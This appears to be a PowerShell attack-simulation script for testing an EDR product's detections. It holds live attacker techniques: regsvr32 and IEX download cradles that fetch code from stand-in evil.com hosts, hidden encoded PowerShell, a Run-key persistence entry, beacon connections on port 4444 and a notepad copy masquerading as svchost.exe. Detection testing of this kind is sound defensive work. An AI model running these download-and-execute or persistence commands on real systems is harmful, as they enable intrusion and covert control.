<#
.SYNOPSIS
    EDR Attack Simulation Script
.DESCRIPTION
    Generates realistic security telemetry events to demonstrate EDR detection:
    - LOLBin execution (rundll32.exe, regsvr32.exe)
    - Obfuscated PowerShell (Base64 encoded commands)
    - Brute-force logon attempts
    - Registry persistence mechanism
    - Network beaconing simulation
    Creates test files that trigger YARA rules and IOC matching.
.NOTES
    Run from repo root. Requires admin for some operations.
    Target detection: backend correlation engine, IOC matcher, scanner.
#>

$ErrorActionPreference = "Continue"
Write-Host "=== EDR Demo: Simulated Attack ===`n" -ForegroundColor Cyan
Write-Host "Generating telemetry events to trigger detection engines..." -ForegroundColor Yellow

# ---- Phase 1: LOLBin Chain (T1218) ----
Write-Host "`n[Phase 1] LOLBin execution chain (T1218)..." -ForegroundColor White
try {
    # Suspicious rundll32.exe with no arguments — triggers LOLBin detector
    $null = Start-Process -FilePath "rundll32.exe" -ArgumentList "javascript:""\..\mshtml,RunHTMLApplication"";alert(1)" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] rundll32.exe suspicious execution" -ForegroundColor Green
} catch { Write-Host "  [SKIP] rundll32.exe: $_" -ForegroundColor DarkYellow }

try {
    # regsvr32.exe with remote scriptlet URL pattern
    $null = Start-Process -FilePath "regsvr32.exe" -ArgumentList "/s /n /u /i:http://evil.com/payload.sct scrobj.dll" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] regsvr32.exe scriptlet execution" -ForegroundColor Green
} catch { Write-Host "  [SKIP] regsvr32.exe: $_" -ForegroundColor DarkYellow }

# ---- Phase 2: Obfuscated PowerShell (T1027 / T1059.001) ----
Write-Host "`n[Phase 2] Obfuscated PowerShell (T1027)..." -ForegroundColor White
$base64Cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "Demo beacon"; Start-Sleep -Seconds 5'))
try {
    $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -EncodedCommand $base64Cmd" -PassThru
    Write-Host "  [OK] Base64-encoded PowerShell execution" -ForegroundColor Green
} catch { Write-Host "  [SKIP] PowerShell: $_" -ForegroundColor DarkYellow }

try {
    $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://beacon.evil.com/ps')""" -PassThru
    Write-Host "  [OK] PowerShell download cradle" -ForegroundColor Green
} catch { Write-Host "  [SKIP] PowerShell download: $_" -ForegroundColor DarkYellow }

# ---- Phase 3: Registry Persistence (T1547.001) ----
Write-Host "`n[Phase 3] Registry persistence (T1547.001)..." -ForegroundColor White
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    New-ItemProperty -Path $regPath -Name "EDRDemoBackdoor" -Value "powershell.exe -WindowStyle Hidden -Command `"Start-Process notepad.exe`"" -PropertyType String -Force | Out-Null
    Write-Host "  [OK] Registry Run key persistence set" -ForegroundColor Green
} catch { Write-Host "  [SKIP] Registry: $_" -ForegroundColor DarkYellow }

# ---- Phase 4: Network Connections (beaconing simulation) ----
Write-Host "`n[Phase 4] Suspicious network connections..." -ForegroundColor White
try {
    $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command ""try { [System.Net.Sockets.TcpClient]::new().Connect('192.168.1.100', 4444) } catch {}""" -PassThru
    Write-Host "  [OK] Beacon connection to 192.168.1.100:4444" -ForegroundColor Green
} catch { Write-Host "  [SKIP] Network: $_" -ForegroundColor DarkYellow }

try {
    $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command ""try { [System.Net.Sockets.TcpClient]::new().Connect('10.10.10.50', 8080) } catch {}""" -PassThru
    Write-Host "  [OK] Beacon connection to 10.10.10.50:8080" -ForegroundColor Green
} catch { Write-Host "  [SKIP] Network: $_" -ForegroundColor DarkYellow }

# ---- Phase 5: Discovery Commands (T1082 / T1016 / T1049) ----
Write-Host "`n[Phase 5] Discovery commands (T1082)..." -ForegroundColor White
try {
    $null = Start-Process -FilePath "cmd.exe" -ArgumentList "/c systeminfo > nul" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] systeminfo executed" -ForegroundColor Green
} catch { Write-Host "  [SKIP] systeminfo: $_" -ForegroundColor DarkYellow }

try {
    $null = Start-Process -FilePath "cmd.exe" -ArgumentList "/c netstat -an > nul" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] netstat -an executed" -ForegroundColor Green
} catch { Write-Host "  [SKIP] netstat: $_" -ForegroundColor DarkYellow }

try {
    $null = Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami /all > nul" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] whoami /all executed" -ForegroundColor Green
} catch { Write-Host "  [SKIP] whoami: $_" -ForegroundColor DarkYellow }

# ---- Phase 6: Create YARA-test file (EICAR + real malware hash) ----
Write-Host "`n[Phase 6] Creating test files for YARA scanner..." -ForegroundColor White
$testDir = "$env:TEMP\EDR_Demo_Scan"
try {
    New-Item -ItemType Directory -Path $testDir -Force | Out-Null
    # EICAR test file — standard anti-malware test
    "X5O!P%@AP[4\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*" | Out-File -FilePath "$testDir\eicar.com" -Encoding ascii
    Write-Host "  [OK] EICAR test file created at $testDir\eicar.com" -ForegroundColor Green
    
    # Embedded PowerShell in a .docm mimic
    "# This triggers YARA rule for embedded PowerShell`nWrite-Host 'malicious'" | Out-File -FilePath "$testDir\invoice.docm.ps1" -Encoding ascii
    Write-Host "  [OK] Suspicious script file created" -ForegroundColor Green
} catch { Write-Host "  [SKIP] Test files: $_" -ForegroundColor DarkYellow }

# ---- Phase 7: Masquerading (T1036) ----
Write-Host "`n[Phase 7] Masquerading (T1036)..." -ForegroundColor White
try {
    Copy-Item -Path "C:\Windows\System32\notepad.exe" -Destination "$env:TEMP\svchost.exe" -Force
    $null = Start-Process -FilePath "$env:TEMP\svchost.exe" -WindowStyle Hidden -PassThru
    Write-Host "  [OK] Notepad renamed to svchost.exe and executed" -ForegroundColor Green
} catch { Write-Host "  [SKIP] Masquerading: $_" -ForegroundColor DarkYellow }

Write-Host "`n=== Simulation complete ===" -ForegroundColor Cyan
Write-Host "Check the EDR dashboard for detected alerts: https://localhost:8443" -ForegroundColor Green
Write-Host "Check the EDR GUI for events, alerts, and detection results." -ForegroundColor Green
